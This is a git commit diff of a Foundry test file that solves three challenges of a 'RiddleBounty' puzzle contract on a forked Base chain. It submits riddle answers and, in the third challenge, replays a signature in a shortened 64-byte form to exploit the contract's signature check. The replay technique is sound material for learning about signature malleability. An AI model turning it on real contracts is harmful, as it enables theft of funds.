863286ff90b7a5bb2b021bd13b3c6a8919b8d39d
robriks <0xkhepri@protonmail.com>
2023-03-06 11:09:09 -0500

    solve challenges using forked Base L2 chain

--- test/RiddleBounty.t.sol
+++ test/RiddleBounty.t.sol
@@ -8,31 +8,63 @@ contract BountyTest is Test {
 
     RiddleBounty public riddleBounty;
 
+    uint256 privKey;
+    address hacker;
+
     uint256 baseFork;
     string BASE_RPC_ENDPOINT = vm.envString("BASE_RPC_ENDPOINT");
     
-    function setup() public {
+    function setUp() public {
         baseFork = vm.createFork(BASE_RPC_ENDPOINT);
         vm.selectFork(baseFork);
+        riddleBounty = RiddleBounty(0xc1e40f9FD2bc36150e2711e92138381982988791); // bounty address on Base chain
+        privKey = vm.envUint("PK");
+        hacker = vm.addr(privKey);
+    }
+
+    function test_solveChallenge1() public {
+        vm.prank(hacker);
+        riddleBounty.solveChallenge1('faucet');
+
+        assertTrue(riddleBounty.hasSolvedChallenge1(hacker));
     }
 
     function test_solveChallenge2() public {
+        test_solveChallenge1(); // challenges must be solved sequentially
+
         bytes memory riddleAnswer2 = bytes('The Merge');
         bytes32 messageHash = keccak256(abi.encodePacked(riddleAnswer2));
+        bytes32 signedMessageHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash));
 
-        (uint8 v, bytes32 r, bytes32 s) = vm.sign(vm.envUint("PK"), messageHash);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privKey, signedMessageHash);
         bytes memory signature = abi.encodePacked(r, s, v);
         console.logBytes(signature);
+
+        vm.prank(hacker);
+        riddleBounty.solveChallenge2('The Merge', signature);
+        
+        assertTrue(riddleBounty.hasSolvedChallenge2(hacker));
     }
 
     function test_solveChallenge3() public {
+        test_solveChallenge1();
+        test_solveChallenge2(); // solve other challenges preceding the third
+
         bytes memory riddleAnswer3 = bytes('EIP-4844');
         bytes32 messageHash = keccak256(abi.encodePacked(riddleAnswer3));
+        bytes32 signedMessageHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash));
 
-        (uint8 v, bytes32 r, bytes32 s) = vm.sign(vm.envUint("PK"), messageHash);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privKey, signedMessageHash);
         bytes memory vulnerableSig = abi.encodePacked(r, s, v);
         console.logBytes(vulnerableSig);
         bytes memory vulnerableSigReplay = abi.encodePacked(r, s);
         console.logBytes(vulnerableSigReplay);
+
+        vm.startPrank(hacker);
+        riddleBounty.solveChallenge3('EIP-4844', hacker, vulnerableSig);
+        riddleBounty.solveChallenge3('EIP-4844', hacker, vulnerableSigReplay);
+        vm.stopPrank();
+
+        assertTrue(riddleBounty.isOnLeaderboard(hacker));
     }
 }
